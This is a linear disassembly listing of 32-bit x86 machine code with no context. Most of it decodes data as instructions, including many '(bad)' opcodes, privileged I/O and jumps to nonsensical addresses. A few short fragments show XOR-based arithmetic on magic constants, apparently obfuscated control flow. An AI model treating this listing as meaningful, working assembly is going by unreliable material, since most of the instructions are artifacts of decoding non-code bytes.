  40210b:	jbe    0x4020bb
  40210d:	add    al,dh
  40210f:	mov    BYTE PTR [edx-0x43f1adcb],ch
  402115:	and    DWORD PTR [ecx-0x61],edx
  402118:	mov    al,ds:0xb3888861
  40211d:	jp     0x4020dd
  40211f:	mov    DWORD PTR [edx],esi
  402121:	out    0xda,eax
  402123:	push   ebx
  402124:	push   ss
  402125:	icebp  
  402126:	add    BYTE PTR [ebx+0x15],dh
  402129:	sbb    edi,DWORD PTR [edx]
  40212b:	mov    eax,0xdfbb6e28
  402130:	mov    ch,0x6a
  402132:	xor    DWORD PTR [esi-0x12955808],eax
  402138:	stc    
  402139:	loop   0x4020c2
  40213b:	jg     0x40216f
  40213d:	xlat   BYTE PTR ds:[ebx]
  40213e:	push   ebx
  40213f:	hlt    
  402140:	mov    WORD PTR [ebp+edx*2+0x66],?
  402144:	int3   
  402145:	test   esp,eax
  402147:	fwait
  402148:	sub    al,0x61
  40214a:	data16 cmp al,0xbd
  40214d:	lods   al,BYTE PTR ds:[esi]
  40214e:	mov    dh,0x89
  402150:	cmp    al,0xf1
  402152:	xor    al,0x72
  402154:	push   ds
  402155:	fbld   TBYTE PTR [ecx-0x39]
  402158:	jmp    0x225c719c
  40215d:	xchg   DWORD PTR [ecx+0x77dffb3d],esi
  402163:	xor    cl,BYTE PTR [esi+esi*8+0x1a08b7c2]
  40216a:	sub    eax,0x9d660eee
  40216f:	add    DWORD PTR [esi+0x305d8c9e],edi
  402175:	cmp    BYTE PTR [esi],ah
  402177:	lds    ecx,FWORD PTR ds:0xcf96aa4d
  40217d:	jle    0x4021f7
  40217f:	mov    bh,0x7
  402181:	jp     0x4021c2
  402183:	hlt    
  402184:	mov    bh,0x89
  402186:	ret    
  402187:	dec    edi
  402188:	and    bl,dl
  40218a:	add    al,0xec
  40218c:	(bad)  
  40218f:	pushf  
  402190:	dec    ecx
  402191:	pop    edx
  402192:	cmp    eax,0x1c677b3b
  402197:	rcl    DWORD PTR [ebp-0x58],cl
  40219a:	add    eax,0xe722628e
  40219f:	icebp  
  4021a0:	out    dx,eax
  4021a1:	loope  0x402216
  4021a3:	or     bh,BYTE PTR [esp+esi*8+0x20f27b1f]
  4021aa:	jno    0x40221a
  4021ac:	frstor [ebx+0x2fd92ce1]
  4021b2:	test   al,0xe9
  4021b4:	ror    BYTE PTR [ebx+0x1865af1f],1
  4021ba:	call   0xfcb4493f
  4021bf:	ret    0x8f62
  4021c2:	jmp    0x1f0d4d6f
  4021c7:	xchg   esp,eax
  4021c8:	in     al,dx
  4021c9:	fnstsw WORD PTR [ebp-0x1adc752a]
  4021cf:	mov    esp,0xcde78c8c
  4021d4:	stos   BYTE PTR es:[edi],al
  4021d5:	retf   
  4021d6:	sbb    ebx,DWORD PTR [ebx-0xa74160f]
  4021dc:	lea    ebx,[esi+0x74]
  4021df:	fisub  WORD PTR [ebp+0x4f]
  4021e2:	scas   al,BYTE PTR es:[edi]
  4021e3:	sbb    ebp,DWORD PTR [ebp+0x5f1a1e2e]
  4021e9:	dec    ebx
  4021ea:	or     bl,BYTE PTR [edi-0x21a7ea5e]
  4021f0:	sbb    al,0x17
  4021f2:	jo     0x40221d
  4021f4:	test   BYTE PTR [edi],ch
  4021f6:	jp     0x4021c2
  4021f8:	sbb    eax,0x712a7d37
  4021fd:	fsub   DWORD PTR [eax-0xb]
  402200:	(bad)  
  402201:	jns    0x402225
  402203:	dec    esi
  402204:	and    ebp,edx
  402206:	addr16 cwde 
  402208:	xchg   esi,eax
  402209:	shr    BYTE PTR [ecx+0x1dc29fc1],cl
  40220f:	mov    eax,ds:0x1dc5d392
  402214:	dec    esp
  402215:	cmp    eax,0x77cfc810
  40221a:	fxch   st(5)
  40221c:	pop    ebx
  40221d:	lods   eax,DWORD PTR ds:[esi]
  40221e:	jp     0x40223b
  402220:	iret   
  402221:	pop    esi
  402222:	loope  0x402274
  402224:	ret    0x7f52
  402227:	cld    
  402228:	and    esp,DWORD PTR [eax-0x46ac66fb]
  40222e:	inc    edx
  40222f:	sbb    BYTE PTR [ebp+edi*4+0x59e26810],0x2b
  402237:	jl     0x40221c
  402239:	outs   dx,DWORD PTR ds:[esi]
  40223a:	ficom  DWORD PTR [esi+0x62]
  40223d:	inc    ecx
  40223e:	cs or  eax,0x9a0bb158
  402244:	(bad)  
  402245:	int    0xd7
  402247:	cmp    ebx,DWORD PTR [edx+0x13]
  40224a:	xchg   esp,eax
  40224b:	add    eax,0xcd5b89bd
  402250:	scas   al,BYTE PTR es:[edi]
  402251:	and    edx,DWORD PTR [edi-0x42]
  402254:	push   eax
  402255:	push   ss
  402256:	ja     0x402203
  402258:	loopne 0x402244
  40225a:	adc    bh,BYTE PTR [edi-0x4de1e4f5]
  402260:	jb     0x4021e6
  402262:	jbe    0x4021e5
  402264:	mov    edx,0xee04adf8
  402269:	xor    eax,0x43226908
  40226e:	dec    eax
  40226f:	nop
  402270:	cmp    BYTE PTR [edx+0x1f95a0b9],al
  402276:	je     0x4026fd
  40227c:	mov    eax,DWORD PTR [ebp-0x14]
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [edx],esi
  40229b:	push   edx
  40229c:	retf   
  40229d:	fdiv   QWORD PTR [eax+0x2]
  4022a0:	jo     0x402312
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	scas   al,BYTE PTR es:[edi]
  4022a7:	fidivr DWORD PTR [eax+0x7f]
  4022aa:	dec    esi
  4022ab:	inc    edx
  4022ac:	in     al,dx
  4022ad:	addr16 ss rcr esi,cl
  4022b1:	stos   DWORD PTR es:[edi],eax
  4022b2:	push   ds
  4022b3:	dec    edi
  4022b4:	arpl   WORD PTR [edx+0x5fb4d6c],ax
  4022ba:	dec    edx
  4022bb:	add    BYTE PTR [ebp+0x50],dh
  4022be:	cwde   
  4022bf:	xchg   DWORD PTR [esi+eax*4-0x50],ebx
  4022c3:	mov    eax,ds:0xd36d8f52
  4022c8:	aad    0x95
  4022ca:	rcl    esi,0x2b
  4022cd:	inc    ecx
  4022ce:	dec    edx
  4022cf:	rcl    BYTE PTR [esi+ebp*4],0xe8
  4022d3:	enter  0x5b5b,0x64
  4022d7:	or     al,0x74
  4022d9:	repnz mov al,ds:0xc815b78a
  4022df:	pop    esi
  4022e0:	cld    
  4022e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022e2:	pushf  
  4022e3:	fnstsw WORD PTR [eax]
  4022e5:	gs mov bh,dh
  4022e8:	jne    0x402361
  4022ea:	mov    ds:0x23dd1b11,eax
  4022ef:	dec    esi
  4022f0:	lahf   
  4022f1:	daa    
  4022f2:	jge    0x4022df
  4022f4:	push   esp
  4022f5:	push   ds
  4022f6:	xor    ecx,0x6f
  4022f9:	pop    edi
  4022fa:	jl     0x402331
  4022fc:	sub    al,0xa
  4022fe:	adc    cl,BYTE PTR [edx+eiz*1]
  402301:	cmp    BYTE PTR [eax+ecx*1-0x6a],bl
  402305:	ja     0x9c9f88a9
  40230b:	dec    edi
  40230c:	mov    edi,0x5968d684
  402311:	cmp    cl,0x29
  402314:	(bad)  
  402315:	mov    esi,0x745d70ac
  40231a:	sbb    BYTE PTR [edx-0x39d2e2ca],ah
  402320:	mov    bl,0x86
  402322:	sbb    al,0x9b
  402325:	cmp    ah,BYTE PTR [ebx-0x12]
  402328:	push   ebx
  402329:	aad    0x84
  40232b:	bound  eax,QWORD PTR [esi+ecx*1]
  40232e:	pusha  
  40232f:	repnz in al,0xbd
  402332:	inc    esi
  402333:	xchg   BYTE PTR cs:[edi+ebp*2+0x112806bf],al
  40233b:	sahf   
  40233c:	int    0x91
  40233e:	xchg   edx,eax
  40233f:	ja     0x4022d3
  402341:	fs dec eax
  402343:	lods   al,BYTE PTR ds:[esi]
  402344:	mov    al,ds:0x509dabf0
  402349:	ror    DWORD PTR [edx-0x63c62800],1
  40234f:	dec    edx
  402350:	pop    ebx
  402351:	sub    eax,0x434d76b8
  402356:	sub    ebx,esi
  402358:	xor    DWORD PTR [esi+0xb],edx
  40235b:	std    
  40235c:	cs ds in al,0x21
  402360:	mov    al,0x48
  402362:	push   ss
  402363:	test   eax,0x19303396
  402368:	(bad)  
  402369:	xor    BYTE PTR [ecx-0x3417674b],ah
  40236f:	xor    esp,DWORD PTR [ebx]
  402371:	adc    WORD PTR [eax+ecx*2],0xebe7
  402377:	pusha  
  402378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402379:	shl    DWORD PTR [ebx+0x906e77d],0x57
  402380:	push   ecx
  402381:	cmp    al,0xf7
  402383:	cmp    DWORD PTR [eax-0x35536de3],edi
  402389:	mov    dh,BYTE PTR [edx]
  40238b:	xlat   BYTE PTR ds:[ebx]
  40238c:	shl    ebx,1
  40238e:	push   esp
  40238f:	xchg   al,al
  402391:	pop    ss
  402392:	mov    eax,0x344c5554
  402397:	aaa    
  402398:	cmp    dh,BYTE PTR [ecx-0x6a]
  40239b:	mov    esp,0xa793cbd2
  4023a0:	mov    edx,?
  4023a2:	mov    al,ds:0x2be651ef
  4023a7:	popa   
  4023a8:	xchg   esp,eax
  4023a9:	shr    ah,cl
  4023ab:	pop    edi
  4023ac:	mov    eax,0x4b23ce0
  4023b1:	add    bh,ah
  4023b3:	imul   BYTE PTR [eax]
  4023b5:	push   edi
  4023b6:	(bad)  
  4023b7:	jmp    0xbe34:0x9a30d4f3
  4023be:	aas    
  4023bf:	in     eax,dx
  4023c0:	outs   dx,BYTE PTR ds:[esi]
  4023c1:	jmp    0x402402
  4023c3:	call   0x8c6bb37b
  4023c8:	hlt    
  4023c9:	cmp    al,0x2d
  4023cb:	fnstsw WORD PTR [ebp+0x7ad80a22]
  4023d1:	xlat   BYTE PTR ds:[ebx]
  4023d2:	loop   0x402418
  4023d4:	and    dh,BYTE PTR [edi]
  4023d6:	lahf   
  4023d7:	push   ebp
  4023d8:	and    cl,dh
  4023da:	jns    0x402459
  4023dc:	jp     0x40244f
  4023de:	push   ebp
  4023df:	mov    BYTE PTR [ecx-0x645afac9],dh
  4023e5:	xchg   edx,eax
  4023e6:	sub    eax,edx
  4023e8:	mov    ebp,0x3071b881
  4023ed:	aad    0x94
  4023ef:	test   al,0x39
  4023f1:	lds    ebp,FWORD PTR [ecx]
  4023f3:	jbe    0x402473
  4023f5:	lock add dh,BYTE PTR [edi+0x31]
  4023f9:	xchg   esi,esp
  4023fb:	jns    0x4023ce
  4023fd:	fidivr DWORD PTR [edi]
  4023ff:	inc    ebx
  402400:	sbb    eax,0xc8367587
  402405:	(bad)  
  402406:	(bad)  
  402407:	xlat   BYTE PTR ds:[ebx]
  402408:	cs jnp 0x402396
  40240b:	or     eax,0x70b5e110
  402410:	cmp    BYTE PTR [ebx],0x3
  402413:	mov    BYTE PTR [eax+0x2d],ah
  402416:	sub    cl,BYTE PTR [ebx-0x74f94d69]
  40241c:	in     eax,0x5e
  40241e:	sbb    al,0x7a
  402420:	mov    ebx,0x696bfe69
  402425:	jmp    0xd719e471
  40242a:	repnz xor al,0x91
  40242d:	sub    ecx,DWORD PTR [ecx-0x74]
  402430:	jbe    0x40248d
  402432:	fcmove st,st(5)
  402434:	or     eax,0x4b5459c9
  402439:	out    0x9,al
  40243b:	test   BYTE PTR [ebx+0x1c],cl
  40243e:	aaa    
  40243f:	call   DWORD PTR [edi+0x6aefbcf5]
  402445:	out    0xcd,eax
  402447:	je     0x40248e
  402449:	pop    esp
  40244a:	ins    DWORD PTR es:[edi],dx
  40244b:	loope  0x40249e
  40244d:	icebp  
  40244e:	pushf  
  40244f:	cmp    bl,BYTE PTR [ecx+0x2a8df62c]
  402455:	adc    al,0x33
  402457:	nop
  402458:	sub    eax,0x456d36d3
  40245d:	add    edi,eax
  40245f:	add    al,ch
  402461:	mov    dh,0x77
  402463:	mov    ebx,0x4ae85698
  402468:	jne    0x4024ac
  40246a:	loop   0x402407
  40246c:	test   DWORD PTR [ebp+0x4c690604],ebx
  402472:	jnp    0x4024cc
  402474:	popf   
  402475:	mov    al,0xa5
  402477:	add    edx,DWORD PTR [eax-0x45]
  40247a:	stc    
  40247b:	push   0x761bc3d0
  402480:	xor    ecx,DWORD PTR [eax+0x3c71e8f1]
  402486:	jmp    0xef80:0x665bfbe
  40248d:	sti    
  40248e:	add    eax,0x58e7dce0
  402493:	push   ds
  402494:	pop    ss
  402495:	in     eax,dx
  402496:	ja     0x40244c
  402498:	stos   BYTE PTR es:[edi],al
  402499:	mov    eax,0x81bcbaff
  40249e:	data16 mov ah,0xf5
  4024a1:	dec    edx
  4024a2:	sbb    dl,bh
  4024a4:	leave  
  4024a5:	push   ebp
  4024a6:	mov    dx,WORD PTR [ebp-0x38]
  4024aa:	mov    ebx,0x8a3e
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx-0x337568c9],cl
  4024f4:	jge    0x402566
  4024f6:	add    BYTE PTR [eax+0x70],dh
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	mov    DWORD PTR [edx+0x3b],ecx
  402500:	arpl   WORD PTR [ebx+edi*8-0x6b],dx
  402504:	bnd jge 0x4024d3
  402507:	mov    ebp,ebx
  402509:	mov    edx,0x9b5488e5
  40250e:	sbb    dl,ah
  402510:	imul   edi,DWORD PTR [edi+0x67],0xffffff8f
  402514:	push   0x83b50f40
  402519:	cmp    dh,dl
  40251b:	stc    
  40251c:	push   edi
  40251d:	push   ds
  40251e:	std    
  40251f:	inc    esi
  402520:	fsubr  DWORD PTR [ebx+0x31]
  402523:	inc    ebp
  402524:	pop    edx
  402525:	mov    ebx,0x8a366ada
  40252a:	pop    ebp
  40252b:	push   ds
  40252c:	js     0x402558
  40252e:	test   DWORD PTR [ebx],0x2f813cdb
  402534:	outs   dx,BYTE PTR ds:[si]
  402536:	ffree  st(5)
  402538:	leave  
  402539:	push   0x532386c5
  40253e:	cmp    eax,0x2e768045
  402543:	mov    bh,0xc4
  402545:	cmp    ecx,DWORD PTR [eax]
  402547:	inc    ebp
  402548:	mov    ah,0x6d
  40254a:	dec    esp
  40254b:	xor    dl,dh
  40254d:	jle    0x4024dd
  40254f:	xchg   esi,eax
  402550:	dec    esp
  402551:	ja     0x4025b6
  402553:	jbe    0x402529
  402555:	div    dh
  402557:	inc    edx
  402558:	cwde   
  402559:	adc    DWORD PTR [edx+0x5f],edx
  40255c:	pop    edi
  40255d:	adc    al,0xda
  40255f:	and    al,0x81
  402561:	add    dh,BYTE PTR [edi]
  402563:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402564:	xchg   edi,eax
  402565:	add    dl,0xbf
  402568:	push   0xffffffd1
  40256a:	push   edi
  40256b:	push   ebp
  40256c:	sub    al,0xa6
  40256e:	shl    BYTE PTR [ebx+0x29],cl
  402571:	ss dec eax
  402573:	leave  
  402574:	imul   ebx,DWORD PTR [edi+ebx*8+0xec018e4],0x4611e8f4
  40257f:	(bad)
  402582:	enter  0xd94c,0xf0
  402586:	(bad)  
  402588:	fidiv  WORD PTR [eax]
  40258a:	jmp    0xe6ac15cd
  40258f:	mov    esi,0x13a968ed
  402594:	adc    al,0xc1
  402596:	mov    esi,0x1de20d62
  40259b:	jae    0x402586
  40259d:	jle    0x4025d5
  40259f:	nop
  4025a0:	and    al,0x69
  4025a2:	das    
  4025a3:	pop    ecx
  4025a4:	je     0x402593
  4025a6:	sbb    eax,0xd5f41d03
  4025ab:	data16 faddp st(4),st
  4025ae:	push   eax
  4025af:	jmp    0x40255e
  4025b1:	iret   
  4025b2:	idiv   dx
  4025b5:	xor    al,BYTE PTR [edx-0x80]
  4025b8:	xchg   esi,eax
  4025b9:	mov    eax,edi
  4025bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025bc:	xor    bl,dl
  4025be:	pop    ecx
  4025bf:	lods   al,BYTE PTR ds:[esi]
  4025c0:	xor    DWORD PTR [ebp+0x2913eaa3],ecx
  4025c6:	test   eax,0xd71b2850
  4025cb:	stc    
  4025cc:	xchg   edx,eax
  4025cd:	nop
  4025ce:	jl     0x4025b6
  4025d0:	out    0x91,al
  4025d2:	int3   
  4025d3:	lods   eax,DWORD PTR ds:[esi]
  4025d4:	jecxz  0x4025ac
  4025d6:	pop    esp
  4025d7:	dec    ebp
  4025d8:	mov    ds:0x7255ef86,eax
  4025dd:	xchg   ebx,eax
  4025de:	daa    
  4025df:	data16 cld 
  4025e1:	inc    eax
  4025e2:	xchg   ebp,eax
  4025e3:	push   0xab9c9c79
  4025e8:	add    al,0xce
  4025ea:	add    eax,0x667801ad
  4025ef:	xor    BYTE PTR [esi+0x23],dl
  4025f2:	xchg   esi,eax
  4025f3:	pop    ecx
  4025f4:	sbb    esi,DWORD PTR [edx]
  4025f6:	pop    ss
  4025f7:	retf   0x842f
  4025fa:	dec    eax
  4025fb:	call   0x48642371
  402600:	jbe    0x402604
  402602:	shr    BYTE PTR [ebx+eiz*2],0xed
  402606:	fist   DWORD PTR [ebp+0xd1b59d7]
  40260c:	cmp    bx,ax
  40260f:	mov    BYTE PTR ds:0x61d7216,ah
  402615:	inc    esi
  402616:	cs push edx
  402618:	jle    0x402697
  40261a:	mov    ebp,0x27c8d1a3
  40261f:	and    eax,0x7ada8fb6
  402624:	lahf   
  402625:	xchg   ebx,eax
  402626:	cmp    edi,esp
  402628:	inc    esp
  402629:	pop    es
  40262a:	mov    bl,0x68
  40262c:	inc    esi
  40262d:	and    bh,BYTE PTR [esi]
  40262f:	jns    0x40262b
  402631:	dec    edx
  402632:	sahf   
  402633:	add    eax,0x6f07ed4e
  402638:	test   DWORD PTR [eax-0x485b87e8],ebx
  40263e:	inc    edi
  40263f:	repz inc ebp
  402641:	xchg   esi,eax
  402642:	sub    ebp,edi
  402644:	xor    esi,DWORD PTR [edi]
  402646:	jnp    0x4026b2
  402648:	adc    al,0x46
  40264a:	adc    edi,DWORD PTR [esi+0x6ce7f6b]
  402650:	adc    eax,0x6442257b
  402655:	ficomp DWORD PTR [edx-0x2f]
  402658:	add    BYTE PTR [ecx+eax*1+0x14],dh
  40265c:	inc    ebp
  40265d:	dec    edx
  40265e:	(bad)  
  40265f:	ds pop eax
  402661:	mov    al,0xed
  402663:	sub    BYTE PTR [eax+eax*4+0x58d5b319],ch
  40266a:	arpl   WORD PTR [eax+0x766d0584],bp
  402670:	adc    DWORD PTR [esi+0x5b35f74b],edi
  402676:	jg     0x4026eb
  402678:	mov    dh,0x4d
  40267a:	aad    0x21
  40267c:	fnsave [eax-0x365df39c]
  402682:	call   0x321288b2
  402687:	cld    
  402688:	add    eax,0x3038e424
  40268d:	enter  0xceea,0xd7
  402691:	in     eax,dx
  402692:	cmp    ah,BYTE PTR fs:[esi-0x74fd11d7]
  402699:	scas   eax,DWORD PTR es:[edi]
  40269a:	pop    ds
  40269b:	sbb    ebp,esp
  40269d:	mov    es,WORD PTR [eax]
  40269f:	or     BYTE PTR [ebp+0x4c276ab5],dl
  4026a5:	adc    edx,DWORD PTR [ebp-0x43]
  4026a8:	dec    BYTE PTR [eax-0x6d]
  4026ab:	jge    0x402704
  4026ad:	sub    edx,DWORD PTR [esi+edx*1-0x1756dd6b]
  4026b4:	call   0xffc5:0xabfe474f
  4026bb:	xor    ebp,0xffffff91
  4026be:	add    eax,0x8d88a1dd
  4026c3:	xor    esp,edx
  4026c5:	jae    0x40269e
  4026c7:	imul   BYTE PTR [edi]
  4026c9:	(bad)  
  4026ca:	mov    cs,WORD PTR [ebx+0xa]
  4026cd:	out    0x8a,al
  4026cf:	call   0xea6a:0xbd30c815
  4026d6:	retf   
  4026d7:	cwde   
  4026d8:	out    dx,al
  4026d9:	jmp    0x402660
  4026db:	fcom   QWORD PTR [ebx]
  4026dd:	pop    edi
  4026de:	xor    cl,BYTE PTR [ebx]
  4026e0:	shl    dl,cl
  4026e2:	mov    ecx,0xb19eda1
  4026e7:	xchg   edi,eax
  4026e8:	dec    eax
  4026e9:	scas   al,BYTE PTR es:[edi]
  4026ea:	ror    BYTE PTR [edx],cl
  4026ec:	test   DWORD PTR [eax],0xed9cee40
  4026f2:	mov    esi,ebp
  4026f4:	stc    
  4026f5:	bound  ecx,QWORD PTR [esi+0x3b4eaf63]
  4026fb:	cmp    bl,BYTE PTR [ebx+ecx*4]
  4026fe:	inc    ebp
  4026ff:	hlt    
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0x75742bb2
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	xchg   ebx,eax
  402768:	sub    BYTE PTR [edx],bh
  40276a:	frstor [ecx+0x4f]
  40276d:	sar    bx,1
  402770:	std    
  402771:	ins    BYTE PTR es:[edi],dx
  402772:	mov    ecx,0x74fd72df
  402777:	adc    DWORD PTR [ebx],ecx
  402779:	mov    ah,BYTE PTR [edi-0x4cb50e03]
  40277f:	mov    esp,DWORD PTR [ebp+0x7af3e6bc]
  402785:	mov    dh,0xec
  402787:	or     ecx,DWORD PTR [eax+ebp*4-0x21]
  40278b:	lds    ebp,FWORD PTR [edx-0x4b]
  40278e:	xor    DWORD PTR [eax],edi
  402790:	loope  0x402739
  402792:	and    cl,bl
  402794:	and    al,0x20
  402796:	fdiv   DWORD PTR [ebx+0x55]
  402799:	or     BYTE PTR [eax+0x3e],bl
  40279c:	push   ebx
  40279d:	mov    bl,0xb6
  40279f:	out    dx,eax
  4027a0:	enter  0x800,0x13
  4027a4:	dec    eax
  4027a5:	jge    0x402797
  4027a7:	jmp    0xaee52a87
  4027ac:	mov    ah,0xe7
  4027ae:	sbb    bl,bh
  4027b0:	inc    esi
  4027b1:	jmp    0x2dc931
  4027b6:	cmp    BYTE PTR [ecx+edx*8],al
  4027b9:	stos   DWORD PTR es:[edi],eax
  4027ba:	jl     0x40279b
  4027bc:	push   ecx
  4027bd:	sar    dh,cl
  4027bf:	sub    bh,0x7a
  4027c2:	mov    ds:0x2bee1ca4,eax
  4027c7:	mov    al,0xde
  4027c9:	ss pusha 
  4027cb:	adc    al,0x4e
  4027cd:	pop    edi
  4027ce:	and    ch,al
  4027d0:	xor    eax,0xa563adb1
  4027d5:	xchg   edi,eax
  4027d6:	retf   
  4027d7:	(bad)  
  4027d8:	mov    al,0x22
  4027da:	lahf   
  4027db:	aam    0xd7
  4027dd:	sub    eax,0xb1b04668
  4027e2:	ret    
  4027e3:	sbb    edx,DWORD PTR [esi-0x355969e6]
  4027e9:	sub    BYTE PTR [esp+eax*1-0x60],bh
  4027ed:	xchg   esi,eax
  4027ee:	dec    esp
  4027ef:	(bad)  
  4027f0:	mov    dh,0xa8
  4027f2:	mov    ch,0x27
  4027f4:	call   0x8dcf245d
  4027f9:	inc    ebp
  4027fa:	outs   dx,DWORD PTR ds:[esi]
  4027fb:	mov    ds:0x179b94df,eax
  402800:	ja     0x402827
  402802:	xchg   esi,eax
  402803:	cli    
  402804:	mov    ebp,0x327af5cb
  402809:	pop    eax
  40280a:	mov    dh,0x34
  40280c:	repz mov al,ds:0x32c5aa07
  402812:	xor    BYTE PTR [eax-0x57],0x7f
  402816:	xor    eax,0xbfe2da8f
  40281b:	cmp    al,0x98
  40281d:	repz (bad) 
  40281f:	sahf   
  402820:	pop    eax
  402821:	inc    edx
  402822:	dec    esp
  402823:	(bad)  
  402825:	sbb    ah,BYTE PTR [esi]
  402827:	push   ss
  402828:	rol    DWORD PTR [ecx],1
  40282a:	rol    DWORD PTR [ebx],cl
  40282c:	cmp    cl,BYTE PTR [ebx+0xd81a203]
  402832:	and    al,0x7c
  402834:	cmp    ecx,ecx
  402836:	ret    
  402837:	sub    ch,ah
  402839:	xchg   esp,eax
  40283a:	int3   
  40283b:	inc    edx
  40283c:	mov    fs,WORD PTR [ebx+0x44]
  40283f:	xchg   DWORD PTR [eax+ebx*8-0x5ec7e859],ebp
  402846:	fldenv [edi]
  402848:	inc    edi
  402849:	mov    dl,0x78
  40284b:	inc    ebp
  40284c:	scas   al,BYTE PTR es:[edi]
  40284d:	loopne 0x40280b
  40284f:	push   ecx
  402850:	in     eax,dx
  402851:	(bad)  
  402854:	jbe    0x402858
  402856:	mov    ch,0xb9
  402858:	das    
  402859:	mov    ds,WORD PTR [edx]
  40285b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40285c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40285d:	in     al,0x1
  40285f:	xchg   ebp,eax
  402860:	inc    ebp
  402861:	cli    
  402862:	das    
  402863:	and    al,0x76
  402865:	push   edx
  402866:	mov    dh,0x63
  402868:	div    DWORD PTR [eax-0xe]
  40286b:	inc    ecx
  40286c:	frstor [edx+0x50d6dc4b]
  402872:	aaa    
  402873:	dec    esi
  402874:	int3   
  402875:	into   
  402876:	cli    
  402877:	or     BYTE PTR [ebx+esi*2],bh
  40287a:	in     eax,dx
  40287b:	jnp    0x4028ca
  40287d:	imul   ebx,DWORD PTR [ecx+0x3c],0x4d
  402881:	sahf   
  402882:	sbb    ch,BYTE PTR [ebx-0x4b]
  402885:	mov    ds:0x9b711885,eax
  40288a:	popf   
  40288b:	inc    esp
  40288c:	mov    ebx,0xfc653715
  402891:	sbb    al,BYTE PTR [ecx+0x4a]
  402894:	das    
  402895:	call   DWORD PTR [edx]
  402897:	inc    esi
  402898:	sahf   
  402899:	aas    
  40289a:	retf   0xb46a
  40289d:	loopne 0x402871
  40289f:	sbb    dh,ah
  4028a1:	ja     0x402824
  4028a3:	cmp    BYTE PTR [ebx-0x3f2bec36],ah
  4028a9:	bound  esp,QWORD PTR [ecx+0x3d095512]
  4028af:	sub    al,0x51
  4028b1:	xor    eax,0x6613425c
  4028b6:	pushf  
  4028b7:	leave  
  4028b8:	call   0x7ff1f729
  4028bd:	aaa    
  4028be:	pop    esi
  4028bf:	xor    bh,BYTE PTR [esi-0x17]
  4028c2:	jns    0x402896
  4028c4:	iret   
  4028c5:	sbb    esp,ebp
  4028c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028c8:	add    esp,ebp
  4028ca:	outs   dx,DWORD PTR ds:[esi]
  4028cb:	xchg   esp,eax
  4028cc:	cs cli 
  4028ce:	not    DWORD PTR [edx+0x4d93c702]
  4028d4:	sub    BYTE PTR [edx+0x34b0f61d],bh
  4028da:	mov    esp,0x3b978a17
  4028df:	lock mul BYTE PTR [edi]
  4028e2:	(bad)  
  4028e3:	(bad)  
  4028e4:	iret   
  4028e5:	out    dx,al
  4028e6:	inc    eax
  4028e7:	and    eax,0x1cd2b0ab
  4028ec:	cli    
  4028ed:	push   0xa
  4028ef:	pop    es
  4028f0:	int    0xb
  4028f2:	das    
  4028f3:	loop   0x4028ac
  4028f5:	into   
  4028f6:	add    eax,0xb251ba7d
  4028fb:	mov    ebp,0xb9efbbd2
  402900:	sbb    al,0x81
  402902:	jp     0x402895
  402904:	sbb    al,0xc9
  402906:	mov    dh,0xc8
  402908:	dec    esi
  402909:	mov    es,esi
  40290b:	cs out 0x2c,eax
  40290e:	pop    edx
  40290f:	nop
  402910:	pop    esp
  402911:	mov    ah,0xf9
  402913:	(bad)  
  402914:	jge    0x40292d
  402916:	rcr    esi,1
  402918:	aam    0x37
  40291a:	mov    edi,0x515a8f9d
  40291f:	sub    BYTE PTR [ebp+0x8a71148],0x1e
  402926:	ret    
  402927:	mov    bl,0xaa
  402929:	and    ch,al
  40292b:	sahf   
  40292c:	and    ch,cl
  40292e:	dec    ebp
  40292f:	mov    WORD PTR [edx-0x18],?
  402932:	popa   
  402933:	xchg   ecx,eax
  402934:	mov    eax,0x351124c7
  402939:	and    DWORD PTR [eax],0xffffff8b
  40293c:	mov    WORD PTR [edx+0x19],ss
  40293f:	xor    al,0x5a
